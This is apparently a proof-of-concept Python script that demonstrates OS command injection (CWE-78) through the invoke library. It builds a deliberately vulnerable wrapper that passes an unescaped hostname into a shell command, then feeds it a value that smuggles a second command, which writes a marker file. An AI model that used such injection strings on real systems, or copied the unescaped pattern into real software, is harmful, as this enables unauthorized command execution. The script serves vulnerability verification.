"""
Real, file-backed proof of the invoke CWE-78 finding -- no harness, no
sandbox. Calls the REAL, installed invoke library's REAL run() function
(the exact function mined and confirmed TRIGGERED: invoke/__init__.py:36,
which internally reaches subprocess.Popen(..., shell=True)).

run_ping() below is a small, realistic VULNERABLE wrapper -- the kind of
naive string-building around invoke.run() that shows up in real automation
scripts/Fabric tasks: takes a hostname, drops it straight into a shell
command with an f-string, no escaping, no allowlist. The "attacker input"
below is a hostname field that breaks out of its intended slot.

Run: python3 real_cmdi_demo.py
Then inspect the result yourself:
    cat pwned_cmdi_proof.txt
"""
import os
import invoke

PROOF_FILE = "pwned_cmdi_proof.txt"
if os.path.exists(PROOF_FILE):
    os.remove(PROOF_FILE)


def run_ping(hostname):
    # VULNERABLE: naive f-string into a shell=True command -- exactly how
    # real apps misuse invoke.run()/Fabric tasks with user-controlled input.
    invoke.run(f"echo pinging {hostname}")


# Attacker-controlled "hostname" field that escapes its intended slot and
# appends a second, real command.
attacker_input = f"127.0.0.1; echo 'exploited via CWE-78, no auth, no sanitization' > {PROOF_FILE}"

print(f"Calling the REAL invoke.run() via a realistic vulnerable wrapper with:\n  hostname={attacker_input!r}\n")
run_ping(attacker_input)

print(f"Done. Real file written to: {os.path.abspath(PROOF_FILE)}")
print("Verify it yourself:")
print(f"  cat {PROOF_FILE}")
